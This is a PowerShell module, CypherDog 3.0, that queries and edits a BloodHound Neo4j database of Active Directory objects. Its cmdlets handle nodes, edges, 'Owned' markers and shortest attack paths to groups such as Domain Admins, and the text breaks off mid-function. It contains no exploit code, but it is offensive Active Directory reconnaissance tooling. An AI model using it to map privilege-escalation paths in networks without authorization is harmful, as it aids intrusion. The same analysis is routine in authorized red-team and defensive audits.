﻿

###########################################################
# CypherDog3.0 - BloodHound Dog Whisperer - @SadProcessor #
###########################################################


###########################################################
#region ############################################## VARS


##################################################### ASCII
$ASCII= @("
 _____________________________________________
 _______|_____________________________________
 ______||__________________________CYPHERDOG__
 ______||-________...____________________3.0__
 _______||-__--||||||||-._____________________
 ________!||||||||||||||||||--________________
 _________|||||||||||||||||||||-______________
 _________!||||||||||||||||||||||.____________
 ________.||||||!!||||||||||||||||-___________
 _______|||!||||___||||||||||||||||.__________
 ______|||_.||!___.|||'_!||_'||||||!__________
 _____||___!||____|||____||___|||||.__________
 ______||___||_____||_____||!__!|||'__________
 ___________ ||!____||!_______________________
 _____________________________________________

 BloodHound Dog Whisperer - @SadProcessor 2020
")

##################################################### Enums

## NodeType
enum NodeType{
    Computer
    Domain
    Group
    User
    GPO
    OU
    }


## EdgeType
enum EdgeType{
    #Default
    MemberOf
    HasSession
    AdminTo
    #TrustedBy
    #ACL
    AllExtendedRights
    AddMember
    ForceChangePassword
    GenericAll
    GenericWrite
    Owns
    WriteDacl
    WriteOwner
    ReadLAPSPassword
    ReadGMSAPassword
    #GPO
    Contains
    GpLink
    #Special
    CanRDP
    CanPSRemote
    ExecuteDCOM
    AllowedToDelegate
    AddAllowedToAct
    AllowedToAct
    SQLAdmin
    HasSIDHistory
    }

# Default
enum EdgeDef{
    MemberOf
    HasSession
    AdminTo
    #TrustedBy  
    }

# ACL
enum EdgeACL{
    AllExtendedRights
    AddMember
    ForceChangePassword
    GenericAll
    GenericWrite
    Owns
    WriteDacl
    WriteOwner
    ReadLAPSPassword
    ReadGMSAPassword    
    }

# GPO/OU
enum EdgeGPO{
    Contains
    GpLink
    }

# Special
enum EdgeSpc{
    CanRDP
    CanPSRemote
    ExecuteDCOM
    AllowedToDelegate
    AddAllowedToAct
    AllowedToAct
    SQLAdmin
    HasSIDHistory
    }


################################################# PathClass
Class BHEdge{
    [int]$ID
    [int]$Step
    [string]$startNode
    [string]$Edge
    [String]$Direction
    [string]$EndNode
    }

################################################# CypherDog
$CypherDog = [PSCustomObject]@{
    Host         = 'localhost'
    Port         = 7474
    UserList     = $Null
    GroupList    = $Null
    ComputerList = $Null
    DomainList   = $Null
    GPOList      = $Null
    OUList       = $Null
    }

#endregion ################################################


###########################################################
#region ############################################## UTIL

# CacheNode
# DynP
# GenEdgeStr
# ToPathObj
# ClipThis
# JoinCypher
# FixPathID

################################################# CacheNode
function CacheNode{
<#
.Synopsis
   Cache Bloodhound Node Lists [Internal]
.DESCRIPTION
   Cache Name Lists per Node type
   All types if none specified
   Use at startup and on Node Create/Delete
.EXAMPLE
    CacheNode
    Caches Name lists for All Node Types
.EXAMPLE
    CacheNode Computer,User
    Caches Name Lists of specified node types
#> 
    [CmdletBinding()]
    Param(
        # Specify Type(s)
        [parameter(Mandatory=0)][NodeType[]]$Type
        )
    # No Type == All
    If($Type -eq $Null){$Type=[Enum]::GetNames([NodeType])}
    # For each type
    foreach($T in $Type){
        Write-Verbose "Caching Node List: $T" 
        # Prep Query
        $Query = "MATCH (n:$T) WHERE EXISTS(n.name) RETURN n.name"
        # Cache matching name list
        $Script:CypherDog."${T}List"=Cypher $Query -Expand Data
        }}
#####End

###################################################### DynP
function DynP{
<#
.Synopsis
   Get Dynamic Param [Internal]
.DESCRIPTION
   Return Single DynParam to be added to dictionnary
.EXAMPLE
    DynP TestParam String -mandatory 1
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=1)][String]$Name,
        [Parameter(Mandatory=1)][string]$Type,
        [Parameter(Mandatory=0)][bool]$Mandat=0,
        [Parameter(Mandatory=0)][int]$Pos=$Null,
        [Parameter(Mandatory=0)][bool]$Pipe=0,
        [Parameter(Mandatory=0)][bool]$PipeProp=0,
        [Parameter(Mandatory=0)]$VSet=$Null
        )
    # Create Attribute Obj
    $Attrb = New-Object Management.Automation.ParameterAttribute
    $Attrb.Mandatory=$Mandat
    $Attrb.ValueFromPipeline=$Pipe
    $Attrb.ValueFromPipelineByPropertyName=$PipeProp
    if($Pos -ne $null){$Attrb.Position=$Pos}
    # Create AttributeCollection
    $Cllct = New-Object Collections.ObjectModel.Collection[System.Attribute]
    # Add Attribute Obj to Collection
    $Cllct.Add($Attrb)
    if($VSet -ne $Null){
        # Create ValidateSet & add to collection     
        $VldSt=New-Object Management.Automation.ValidateSetAttribute($VSet)
        $Cllct.Add($VldSt)
        }
    # Create Runtine DynParam
    $DynP = New-Object Management.Automation.RuntimeDefinedParameter("$Name",$($Type-as[type]),$Cllct)
    # Return DynParam
    Return $DynP
    }
#End

################################################ GenEdgeStr
function GenEdgeStr{
<#
.Synopsis
   Generate Edge String [Internal]
.DESCRIPTION
   Generate Edge String for Cypher Queries 
.EXAMPLE
   GenEdgeStr NoACL,NoSpc -Include ForceChangePassword
#>
    Param(
        [ValidateSet('NoDef','NoACL','NoGPO','NoSpc')]
        [Parameter(Mandatory=0)][String[]]$Type,
        [Parameter(Mandatory=0)][Edgetype[]]$Exclude,
        [Parameter(Mandatory=0)][Edgetype[]]$Include
        )
    # Start with all
    $R = [Enum]::GetNames([EdgeType])
    # Exclude Category
    Switch -regex ($Type) {
        NoDef {$R = (Compare $R ([Enum]::GetNames([EdgeDef]))).InputObject}
        NoACL {$R = (Compare $R ([Enum]::GetNames([EdgeACL]))).InputObject}
        NoGPO {$R = (Compare $R ([Enum]::GetNames([EdgeGPO]))).InputObject}
        NoSpc {$R = (Compare $R ([Enum]::GetNames([EdgeSpc]))).InputObject}
        }
    # Exclude stuff
    foreach($x in $Exclude){$R = $R -ne $x}
    # Include stuff
    Foreach($y in $Include){$R += $y}
    # Return String
    Return $R -join '|:'
    }
#end

################################################# ToPathObj
function ToPathObj{
<#
.Synopsis
   Parse to Path Object [Internal]
.DESCRIPTION
   Format query result as Path Object
.EXAMPLE
    Example
#>
    [CmdletBinding()]
    [OutputType([BHEdge])]
    [Alias()]
    Param(
        [Parameter(ValueFromPipeline=1)][Object[]]$Data
        )
    Begin{$ID=0;$Result=@()}
    Process{
        foreach($D in $Data){
        $StepCount = $D.relationships.count
		# if Steps
        if($StepCount -gt 0){
            $PathObj = @()
            0..($StepCount -1)|%{
                [BHEdge]@{
                    'ID'         = $ID
                    'Step'       = $_
                    'StartNode'  = (irm -Method Get -Headers $header -uri @($D.nodes)[$_]).data.name 
                    'Edge'       = (irm -Method Get -Headers $header -uri @($D.relationships)[$_]).type
                    'EndNode'    = (irm -Method Get -Headers $header -uri @($D.nodes)[$_+1]).data.name
                    'Direction'  = @($D.directions)[$_]
                    } | select 'ID','Step','StartNode','Edge','Direction','EndNode'}
            $ID+=1
            }}}
    End{<#NoOp#>}
    }
#End

################################################## ClipThis
Function ClipThis{
<#
.Synopsis
   Query to Clipboard  [Internal]
.DESCRIPTION
   Displays resulting query and sets clipboard
.EXAMPLE
   ClipThis $Query [-with $Params]
#>
    [CmdletBinding()]
    Param(
        # Query
        [Parameter(Mandatory=1)][String]$Query,
        # Params
        [Parameter(Mandatory=0)][Alias('With')][HashTable]$Params
        )
    # If Params
    if($Params.count){$Params.keys|%{$Query=$Query.replace("{$_}","'$($Params.$_)'")}}
    # Verbose
    Write-Verbose "$Query"
    # Clipboard
    $Query | Set-ClipBoard
    # Return Query
    Return $Query
    }
#End

################################################ JoinCypher
function JoinCypher{
<#
.Synopsis
   Cypher Query Union
.DESCRIPTION
   Join Cypher Querie with UNION
.EXAMPLE
   Example
#>
    [Alias('Union')]
    Param(
        [Parameter(ValueFromPipeline=1)][string[]]$Queries
        )
    Begin{$QCollection = @()}
    Process{foreach($Q in $Queries){$QCollection+=$Q}}
    End{$Out=$QCollection-join"`r`nUNION ALL`r`n";$Out|Set-clipboard;Return $Out}
    }
#End

################################################# FixPathID
function FixPathID{
<#
.Synopsis
   Fix Path ID
.DESCRIPTION
   Fix Path ID
.EXAMPLE
   Example
#>
    [Alias('FixID')]
    Param(
        [Parameter(mandatory=1,ValueFromPipeline=1)][BHEdge]$Path
        )
    Begin{$ID=-1}
    Process{foreach($P in $Path){
        if($P.Step -eq 0){$ID+=1}
        $P.ID=$ID
        Return $P
        }}
    End{}
    }
#end

#endregion ################################################


###########################################################
#region ############################################## MISC

# Get-BloodHoundCmdlet
# Send-BloodHoundPost

################################################ BloodHound
function Get-BloodHoundCmdlet{
<#
.Synopsis
   BloodHound RTFM - Get Cmdlet
.DESCRIPTION
   Get Bloodhound [CypherDog] Cmdlets
.EXAMPLE
   BloodHound
.EXAMPLE
   BloodHound -Online
#>
    [CmdletBinding(HelpURI='https://Github.com/SadProcessor')]
    [Alias('BloodHound','CypherDog')]
    Param([Parameter()][Switch]$Online)
    if($Online){Get-Help Get-BloodHoundCmdlet -Online; Return}
    $CmdList = @(
    ######################################################################################################################
    # CMDLET                                 | SYNOPSIS                                        | Alias                   |
    ######################################################################################################################
	@{Cmdlet='Get-BloodHoundCmdlet'          ; Synopsis='BloodHound RTFM - Get Cmdlet'         ; Alias='BloodHound'      }
	@{Cmdlet='Send-BloodHoundPost'           ; Synopsis='BloodHound POST - Cypher to REST API' ; Alias='Cypher'         }
    ######################################################################################################################
	@{Cmdlet='Get-BloodHoundNode'            ; Synopsis='BloodHound Node - Get Node'           ; Alias='Node'            }
	@{Cmdlet='Search-BloodHoundNode'         ; Synopsis='BloodHound Node - Search Node'        ; Alias='NodeSearch'      }
	@{Cmdlet='New-BloodHoundNode'            ; Synopsis='BloodHound Node - Create Node'        ; Alias='NodeCreate'      }
	@{Cmdlet='Set-BloodHoundNode'            ; Synopsis='BloodHound Node - Update Node'        ; Alias='NodeUpdate'      }
	@{Cmdlet='Remove-BloodHoundNode'         ; Synopsis='BloodHound Node - Delete Node'        ; Alias='NodeDelete'      }
	@{Cmdlet='Get-BloodHoundNodeList'        ; Synopsis='BloodHound Node - Get List'           ; Alias='List'            }
	@{Cmdlet='Get-BloodHoundNodeHighValue'   ; Synopsis='BloodHound Node - Get HighValue'      ; Alias='HighValue'       }
	@{Cmdlet='Get-BloodHoundNodeOwned'       ; Synopsis='BloodHound Node - Get Owned'          ; Alias='Owned'           }
	@{Cmdlet='Get-BloodHoundNodeNote'        ; Synopsis='BloodHound Node - Get Notes'          ; Alias='Note'            }
	@{Cmdlet='Set-BloodHoundNodeNote'        ; Synopsis='BloodHound Node - Set Notes'          ; Alias='NoteUpdate'      }
	@{Cmdlet='Get-BloodHoundBlacklist'       ; Synopsis='BloodHound Node - Get Blacklist'      ; Alias='Blacklist'       }
	@{Cmdlet='Set-BloodHoundBlacklist'       ; Synopsis='BloodHound Node - Set Blacklist'      ; Alias='BlacklistAdd'    }
	@{Cmdlet='Remove-BloodHoundBlacklist'    ; Synopsis='BloodHound Node - Remove Blacklist'   ; Alias='BlacklistDelete' }
    ######################################################################################################################
	@{Cmdlet='Get-BloodHoundEdge'            ; Synopsis='BloodHound Edge - Get Target'         ; Alias='Edge'            }
	@{Cmdlet='Get-BloodHoundEdgeReverse'     ; Synopsis='BloodHound Edge - Get Source'         ; Alias='EdgeR'           }
	@{Cmdlet='Get-BloodHoundEdgeCrossDomain' ; Synopsis='BloodHound Edge - Get CrossDomain'    ; Alias='CrossDomain'     }
	@{Cmdlet='Get-BloodHoundEdgeCount'       ; Synopsis='BloodHound Edge - Get Count'          ; Alias='EdgeCount'       }
	@{Cmdlet='Get-BloodHoundEdgeInfo'        ; Synopsis='BloodHound Edge - Get Info'           ; Alias='EdgeInfo'        }
	@{Cmdlet='New-BloodHoundEdge'            ; Synopsis='BloodHound Edge - Create Edge'        ; Alias='EdgeCreate'      }
	@{Cmdlet='Remove-BloodHoundEdge'         ; Synopsis='BloodHound Edge - Delete Edge'        ; Alias='EdgeDelete'      }
    ######################################################################################################################
	@{Cmdlet='Get-BloodHoundPathShort'       ; Synopsis='BloodHound Path - Get Shortest'       ; Alias='Path'            }
	@{Cmdlet='Get-BloodHoundPathAny'         ; Synopsis='BloodHound Path - Get Any'            ; Alias='PathAny'         }
	@{Cmdlet='Get-BloodHoundPathCost'        ; Synopsis='BloodHound Path - Get Cost'           ; Alias='PathCost'        }
	@{Cmdlet='Get-BloodHoundPathCheap'       ; Synopsis='BloodHound Path - Get Cheapest'       ; Alias='PathCheap'       }
	@{Cmdlet='Get-BloodHoundWald0IO'         ; Synopsis='BloodHound Path - Wald0 Index'        ; Alias='Wald0IO'         }
    @{Cmdlet='Get-BloodHoundWald0IOAVG'      ; Synopsis='BloodHound Path - Wald0 Index Average'; Alias='Wald0IOAVG'      }
    ######################################################################################################################
    )
    # Return Help Obj
    Return $CmdList | %{New-Object PSCustomObject -Property $_} | Select Cmdlet,Synopsis,Alias,@{n='RTFM';e={"Help $($_.Alias)"}}
    }
#End

################################################### Cypher
function Send-BloodHoundPost{
<#
.Synopsis
   BloodHound POST - Cypher to REST API
.DESCRIPTION
   Cypher $Query [$Params] [-expand <prop,prop>]
   Post Cypher Query to DB REST API
.EXAMPLE
    $query="MATCH (n:User) RETURN n"
    Cypher $Query
.EXAMPLE
    $query  = "MATCH (A:Computer {name: {ParamA}}) RETURN A"
    $Params = @{ParamA="APOLLO.EXTERNAL.LOCAL"}
    Cypher $Query $Params
.EXAMPLE
    $Query = "MATCH (A:User {name: {ParamA}}), (B:Group {name: {ParamB}}), x=shortestPath((A)-[*1..]->(B)) RETURN x"
    $Params= @{ParamA="ACHAVARIN@EXTERNAL.LOCAL";ParamB="DOMAIN ADMINS@EXTERNAL.LOCAL"}
    Cypher $Query $Params -Expand Data | ToPathObj
.EXAMPLE
    $Query="MATCH 
       (U:User)-[r:MemberOf|:AdminTo*1..]->(C:Computer)
       WITH
       U.name as n,
       COUNT(DISTINCT(C)) as c 
       RETURN 
       {Name: n, Count: c} as SingleColumn
       ORDER BY c DESC
       LIMIT 10"
    Cypher $Query -x $Null
#>
    [CmdletBinding()]
    [Alias('Cypher')]
    Param(
        [Parameter(Mandatory=1)][string]$Query,
        [Parameter(Mandatory=0)][Hashtable]$Params,
        [Parameter(Mandatory=0)][Alias('x')][String[]]$Expand=@('data','data'),
        [Parameter(Mandatory=0)][Switch]$Profile
        )
    # Uri 
    $Uri = "http://$($CypherDog.Host):$($CypherDog.Port)/db/data/cypher"
    # Header
    $Header=@{'Accept'='application/json; charset=UTF-8';'Content-Type'='application/json'}
    # Query
    if($Profile){$QUery="PROFILE "+$Query;$Expand='plan'}
    # Body
    if($Params){$Body = @{params=$Params; query=$Query}|Convertto-Json}
    else{$Body = @{query=$Query}|Convertto-Json}
    # Call
    write-verbose $Body.replace(')\u003c-',')<-').replace('-\u003e(','->(').replace('\r','').replace('\n',' ').replace('\u0027',"'")
    $Reply = Try{Invoke-RestMethod -Uri $Uri -Method Post -Headers $Header -Body $Body}Catch{$Oops = $Error[0].ErrorDetails.Message}
    # Format obj
    if($Oops){Write-Warning "$((ConvertFrom-Json $Oops).message)";Return}
    if($Expand){$Expand | %{$Reply = $Reply.$_}} 
    if($Profile){
        $Output = @(); $Step = 0; $Obj = $Reply
        while($Step -eq 0 -OR $Obj.children){
            if($Obj){
                [HashTable]$Props = @{}
                $Props.add('Step',"$Step")
                $Props.add('Name',"$($Obj.name)")
                $Argum = $Obj.args
                $Argum | GM | ? MemberType -eq NoteProperty | %{ 
                    $Key = $_.name; $Value = $Argum.$Key 
                    $Props.add("$Key","$Value")
                    }
                $Output += New-Object PSCustomObject -Property $Props
                }
            $Obj = $Obj.children; $Step += 1; $Reply = $Output
            }}
    # Output Reply
    if($Reply){Return $Reply}
    }
#End

#endregion ################################################


###########################################################
#region ############################################## NODE

# Get-BloodHoundNode
# Search-BloodHoundNode
# New-BloodHoundNode
# Set-BloodHoundNode
# Remove-BloodHoundNode
# Get-BloodHoundNodeList
# Get-BloodHoundNodeHighValue
# Get-BloodHoundNodeOwned
# Get-BloodHoundNodeNote
# Set-BloodHoundNodeNote
# Get-BloodHoundBlacklist
# Set-BloodHoundBlacklist
# Remove-BloodHoundBlacklist

###################################################### Node
function Get-BloodHoundNode{
<#
.Synopsis
   BloodHound Node - Get Node
.DESCRIPTION
   Get BloodHound Node by Type and Name(s)
.EXAMPLE
   Get-BloodhoundNode User
.EXAMPLE
   Node User BRITNI_GIRARDIN@DOMAIN.LOCAL  
#>
    [CmdletBinding()]
    [Alias('Get-Node','Node')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValuefromPipeline=0)][NodeType]$Type,
        [Parameter(Mandatory=0)][Switch]$Label,
        [Parameter(Mandatory=0)][Switch]$Notes,
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynNameList = @($Script:CypherDog."${Type}List")
        # Prep DynP
        $DynName = DynP -Name 'Name' -Type 'String[]' -Mandat 0 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $DynNameList
        # DynP to Dico
        $Dico.Add("Name",$DynName)
        # Return Dico
        Return $Dico
        }
    Begin{<#NoOp#>}
    Process{
        ## If No Name 
        If(-Not$DynName.IsSet){
            # Query
            if($Label){Write-Warning "Must specify Name(s) when requesting Labels...";Return}
            else{$Query = "MATCH (n:$Type) RETURN n ORDER BY n.name"}
            if(-Not$Cypher){Cypher $Query}
            }
        ## Else, for each name
        Else{Foreach($Name in $DynName.Value){
                # If Label
                if($Label){
                    $Query = "MATCH (n:$Type {name: '$Name'}) RETURN LABELS(n)"
                    if(-Not$Cypher){
                        $L= Cypher $Query -expand data | Select -ExpandProperty SyncRoot
                        New-Object PSCustomObject -Property @{Name="$Name";Label=@($L)}
                        }}
                else{$Query = "MATCH (n:$Type {name: '$Name'}) RETURN n"
                    if(-Not$Cypher){
                        $Res = Cypher $Query
                        If($Notes){$Res | Select -Expand notes -ea SilentlyContinue}
                        Else{$Res}
                        }}}}}
    End{if($Cypher){ClipThis $Query}}
    }
#End

################################################ NodeSearch
function Search-BloodHoundNode{
<#
.Synopsis
   BloodHound Node - Search Node
.DESCRIPTION
   Search Nodes by partial Name or Properties
.EXAMPLE
   NodeSearch Group admin
.EXAMPLE
   Nodesearch User -Property sensitive -Value $true
#>
    [CmdletBinding(DefaultParameterSetName='Key')]
    [Alias('Search-Node','NodeSearch')]
    Param(
        # Node Type
        [Parameter(Mandatory=0,Position=0,ParameterSetName='Key')]
        [Parameter(Mandatory=0,Position=0,ParameterSetName='PropNot')]
        [Parameter(Mandatory=0,Position=0,ParameterSetName='PropVal')]
        [Parameter(Mandatory=0,Position=0,ParameterSetName='Prop')]
        [Parameter(Mandatory=0,Position=0,ParameterSetName='LabelNot')]
        [Parameter(Mandatory=0,Position=0,ParameterSetName='Label')][NodeType]$Type,
        # Property Name
        [Parameter(Mandatory=1,ParameterSetName='PropNot')]
        [Parameter(Mandatory=1,ParameterSetName='PropVal')]
        [Parameter(Mandatory=1,ParameterSetName='Prop')][String]$Property,
        # Label
        [Parameter(Mandatory=1,ParameterSetName='LabelNot')]
        [Parameter(Mandatory=1,ParameterSetName='Label')][String]$Label,
        # Property Name & Value
        [Parameter(Mandatory=1,ParameterSetName='PropVal')][String]$Value,
        # Property/Label doesn't exists
        [Parameter(Mandatory=1,ParameterSetName='LabelNot')]
        [Parameter(Mandatory=1,ParameterSetName='PropNot')][Switch]$NotExist,
        # KeyWord
        [Parameter(Mandatory=1,Position=1,ParameterSetName='Key')][Regex]$Key,
        # Case Sensitive
        [Parameter(Mandatory=0,ParameterSetName='Key')][Switch]$Sensitive,
        # Show Cypher
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    if($Type -ne $null){$T=":$type"}
    if(-Not$Sensitive){$CS='(?i)'}
    # Prep Query
    Switch ($PSCmdlet.ParameterSetName){
        "Key"     {$Query= "MATCH (X$T) WHERE X.name =~ {KEY} RETURN X ORDER BY X.name"        ; $Param= @{KEY="$CS.*$Key.*"}}
        "Label"   {$Query= "MATCH (X$T) WHERE X:$Label RETURN X ORDER BY X.name"               ; $Param= $Null}
        "LabelNot"{$Query= "MATCH (X$T) WHERE NOT X:$Label RETURN X ORDER BY X.name"           ; $Param= $Null}
        "Prop"    {$Query= "MATCH (X$T) WHERE exists(X.$Property) RETURN X ORDER BY X.name"    ; $Param= $Null}
        "PropNot" {$Query= "MATCH (X$T) WHERE NOT exists(X.$Property) RETURN X ORDER BY X.name"; $Param= $Null}
        "PropVal" {
            if(-not($Value -match "true|false" -OR $value -as [int])){$Value = "'$Value'"}
            $Query= "MATCH (X$T) WHERE X.$Property = $Value RETURN X ORDER BY X.name"
            $Param= $Null
            }}
    # Call Dog
    if($Cypher){ClipThis $Query $Param}
    Else{Cypher $Query $Param}
    }
#End

################################################ NodeCreate
function New-BloodHoundNode{
<#
.Synopsis
   BloodHound Node - Create Node
.DESCRIPTION
   Create New Node by type
.EXAMPLE
   New-BloodHoundNode -Type User -name Bob
.EXAMPLE
   NodeCreate User Bob 
#>
    [CmdletBinding(DefaultParameterSetName="Other")]
    [Alias('New-Node','NodeCreate')]
    Param(
        # Node Type [Mandatory]
        [Parameter(Mandatory=1,Position=0)][NodeType]$Type,
        # Node Name [Mandatory]
        [Parameter(Mandatory=1,Position=1,ValueFromPipeline=1)][String[]]$Name,
        # Specify Node Properties [Option]
        [Parameter(Mandatory=0,Position=2,ParameterSetName='Props')][Hashtable]$Property,
        # Clone similar Node Properties [Option]
        [Parameter(Mandatory=1,ParameterSetName='Clone')][Switch]$Clone,
        # Cypher [Option]
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    Begin{$Query = "MERGE (X:$Type {name: {NAME}})"}
    Process{
        Foreach($N in $Name){
            $Param = @{NAME="$N"}
            if(-Not$Cypher){Cypher $Query $Param}
            }
        # Cache Updated Type
        if(-Not$Cypher){
            # Refresh cache
            CacheNode $Type
            # If Props
            if($Property.Count){$P=$Property}
            # If Clone
            if($Clone){
                [HashTable]$P=@{}
                (Node $Type | Get-Member | Where MemberType -eq Noteproperty).name -ne 'name' | %{$P.add($_,'tbd')}
                }
            foreach($N in $Name){
                $Splat = @{
                    Type=$type
                    Name=$Name
                    }
                if($P.count){
                    $Splat.add('Property',$P)
                    NodeUpdate @Splat
                    }}}}
    # If Cypher ####
    End{if($Cypher){
            $FullQ="$Query`r`n$(NodeUpdate @Splat -Cypher)"
            ClipThis $FullQ $Param
            }}}
#########End

################################################ NodeUpdate
function Set-BloodHoundNode{
<#
.Synopsis
   BloodHound Node - Update Node
.DESCRIPTION
   Update BloodHound Node Properties
.EXAMPLE
   Set-BloodHoundNode User Bob @{MyProp='This'}
#>
    [CmdletBinding(DefaultParameterSetName='UpdateProp')]
    [Alias('Set-Node','NodeUpdate')]
    Param(
        [Parameter(Mandatory=1,Position=0,ParameterSetName='DeleteLabel')]
        [Parameter(Mandatory=1,Position=0,ParameterSetName='UpdateLabel')]
        [Parameter(Mandatory=1,Position=0,ParameterSetName='UpdateProp')]
        [Parameter(Mandatory=1,Position=0,ParameterSetName='DeleteProp')][NodeType]$Type,
        [Parameter(Mandatory=1,ParameterSetName='DeleteLabel')]
        [Parameter(Mandatory=1,ParameterSetName='DeleteProp')][Switch]$Delete,
        [Parameter(Mandatory=0,ParameterSetName='DeleteLabel')]
        [Parameter(Mandatory=0,ParameterSetName='UpdateLabel')]
        [Parameter(Mandatory=0,ParameterSetName='DeleteProp')]
        [Parameter(Mandatory=0,ParameterSetName='UpdateProp')][Switch]$Cypher,
        [Parameter(Mandatory=1,ParameterSetName='DeleteLabel')]
        [Parameter(Mandatory=1,ParameterSetName='UpdateLabel')][Switch]$Label
        )
    DynamicParam{
        # Prep Dico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynNameList = $Script:CypherDog."${Type}List"
        # Prep DynP
        $DynName = DynP -Name 'Name' -Type 'String[]' -Mandat 1 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $DynNameList
        $Dico.Add('Name',$DynName)
        # If Delete Prop
        if($PSCmdlet.ParameterSetName -eq 'DeleteProp'){
            $DynProp = DynP -Name 'Property' -Type 'String[]'-Mandat 1 -Pos 2 -Pipe 0 -PipeProp 0 -VSet $Null
            $Dico.Add('Property',$DynProp)
            }
        # If Update Prop
        if($PSCmdlet.ParameterSetName -eq 'UpdateProp'){
            $DynProp = DynP -Name 'Property' -Type 'HashTable'-Mandat 1 -Pos 2 -Pipe 0 -PipeProp 0 -VSet $Null
            $Dico.Add('Property',$DynProp)
            }
        # If Label Update/delete
        if($PSCmdlet.ParameterSetName -in 'UpdateLabel','DeleteLabel'){
            $DynLabel = DynP -Name 'LabelName' -Type 'String[]' -Mandat 1 -Pos 2 -Pipe 0 -PipeProp 0 -VSet $Null
            $Dico.Add('LabelName',$DynLabel)
            } 
        # Return Dico
        Return $Dico
        }
    Begin{<#NoOp#>}
    Process{foreach($Name in @($DynName.Value)){
            # Set Name Param
            $Param = @{NAME="$Name"}
            # If Delete props
            if($PSCmdlet.ParameterSetName -eq 'DeleteProp'){
                # Query
                $Query="MATCH (X:$Type) WHERE X.name = {NAME} REMOVE"
                # Append each Prop Names
                $DynProp.Value|%{$Query += " X.$_,"}
                }
            # If Update Props
            if($PSCmdlet.ParameterSetName -eq 'UpdateProp'){
                # Query
                $Query = "MATCH (X:$Type) WHERE X.name = {NAME} SET"
                # For each Prop
                $DynProp.Value.Keys|%{
                    # Append Prop to Query
                    $Query+=" X.$_={$_},"
                    # Add to Param
                    $Param += @{$_=$($DynProp.Value.$_)}
                    }}
            # If Update Label
            if($PSCmdlet.ParameterSetName -eq 'UpdateLabel'){
                # Query
                $Query = "MATCH (X:$Type) WHERE X.name = {NAME} SET"
                # For each Prop
                $DynLabel.Value|%{
                    # Append Prop to Query
                    $Query+=" X:$_,"
                    }}               
            # If Delete Label
            if($PSCmdlet.ParameterSetName -eq 'DeleteLabel'){
                # Query
                $Query = "MATCH (X:$Type) WHERE X.name = {NAME} REMOVE"
                # For each Prop
                $DynLabel.Value|%{
                    # Append Prop to Query
                    $Query+=" X:$_,"
                    }}
            # Query
            $Query=$Query.trimEnd(',')
            # If Not Cypher
            if(-Not$Cypher){Cypher $Query $Param}
            }}
    End{if($Cypher){ClipThis $Query $Param}}
    }
#End

################################################ NodeDelete
function Remove-BloodHoundNode{
<#
.Synopsis
   BloodHound Node - Delete Node
.DESCRIPTION
   Delete Bloodhound Node from Database
.EXAMPLE
   Remove-BloodhoundNode Remove-BloodHoundNode -Type User -Name Bob
.EXAMPLE
   NodeDelete User Bob -Force
#>
    [CmdletBinding(SupportsShouldProcess=1,ConfirmImpact='High')]
    [Alias('Remove-Node','NodeDelete')]
    Param(
        # Node Type [Mandatory]
        [Parameter(Mandatory=1,Position=0)][NodeType]$Type,
        # Force (Skip Confirm)
        [Parameter(Mandatory=0)][Alias('x')][Switch]$Force,
        # Force (Skip Confirm)
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    DynamicParam{
        # Prep Dico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynNameList = $Script:CypherDog."${Type}List"
        # Prep DynP
        $DynName = DynP -Name 'Name' -Type 'String[]' -Mandat 1 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $DynNameList
        $Dico.Add('Name',$DynName)
        # Return Dico
        Return $Dico
        }
    Begin{$Query = "MATCH (X:$Type {name: {NAME}}) DETACH DELETE X"}
    Process{
        Foreach($N in $DynName.Value){
            $Param = @{NAME="$N"}
            if($Cypher){ClipThis $Query $Param}
            # Else
            Else{
                # If Force
                if($Force){Cypher $Query $Param}
                # Else Confirm
                else{if($PSCmdlet.ShouldProcess($N,'DELETE NODE')){
                        # Call Dog
                        Cypher $Query $Param
                        }}}}}
    # Cache Node Type ##
    End{if(-Not$Cypher){CacheNode $Type}}
    }
#End

###################################################### List
Function Get-BloodHoundNodeList{
<#
.Synopsis
   BloodHound Node - Get List
.DESCRIPTION
   List BloodHound nodes per Edge
.EXAMPLE
   List Membership ALBINA_BRASHEAR@DOMAIN.LOCAL
#>
    [Cmdletbinding()]
    [Alias('NodeList','List')]
    Param(
        [ValidateSet('logon','Session','AdminTo','AdminBy','Member','Membership')]
        [Parameter(Mandatory=1,Position=0)][String]$Type
        )
    DynamicParam{
        # Prep Name List
        Switch($Type){
            Logon      {$NameList = $CypherDog.UserList    }
            Session    {$NameList = $CypherDog.ComputerList}
            AdminTo    {$NameList = $CypherDog.ComputerList}
            AdminBy    {$NameList = $CypherDog.UserList    }
            Member     {$NameList = $CypherDog.GroupList   }
            Membership {$NameList = $CypherDog.UserList    }
            }
        # DynDico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # DynName
        $DynName   = DynP -Name 'Name' -Type 'String' -Mandat 1 -Pos 1 -Pipe 1 -PipeProp 1 -VSet $NameList
        $Dico.Add('Name',$DynName)
        # DynSub
        $Pos=2
        if($PSBoundParameters.Type -match "AdminTo|AdminBy"){
            $DynSub=DynP -Name 'SubType' -Type 'String' -Mandat 0 -Pos $Pos -Pipe 0 -PipeProp 0 -VSet @('Direct','Delegated','Derivative')
            $Dico.Add('SubType',$DynSub)
            $Pos+=1
            }
        # DynDom
        $DynDom = DynP -Name 'Domain' -Type 'String' -Pos $Pos -Mandat 0 -VSet @($Script:CypherDog.DomainList)
        $Dico.Add('Domain',$DynDom)
        $Pos+=1
        # DynCypher
        $DynCypher = DynP -Name 'Cypher' -Type 'Switch' -Mandat 0 -Pos $Pos -Pipe 0 -PipeProp 0 -VSet $Null
        $Dico.Add('Cypher',$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{
        # Edge string
        Switch ($DynSub.Value){
            Direct    {$E=':AdminTo*1'}
            Delegated {$E=':MemberOf*1..]->(g:Group)-[r2:AdminTo'}
